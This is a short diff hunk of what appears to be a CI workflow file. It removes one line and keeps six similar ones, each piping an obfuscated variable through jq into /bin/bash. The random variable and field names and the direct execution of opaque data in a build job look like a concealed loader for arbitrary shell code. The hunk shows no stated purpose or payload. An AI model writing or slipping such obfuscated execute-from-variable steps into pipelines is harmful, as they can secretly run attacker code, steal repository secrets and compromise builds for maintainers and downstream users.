@@ -39,7 +39,6 @@ jobs:
           printf '%s' "$xumc8583" | jq -r .ce282 | /bin/bash
           echo $lyj74909 | jq -r .mjx29171 | /bin/bash
           printf '%s' "$efv0670" | jq -r .fzeoi0928 | /bin/bash
-          echo $qvqdf39 | jq -r .xf01587 | /bin/bash
           echo $wcbis9 | jq -r .o34 | /bin/bash
           echo $t732 | jq -r .sho169 | /bin/bash
           echo $mkmwe143 | jq -r .gch9 | /bin/bash
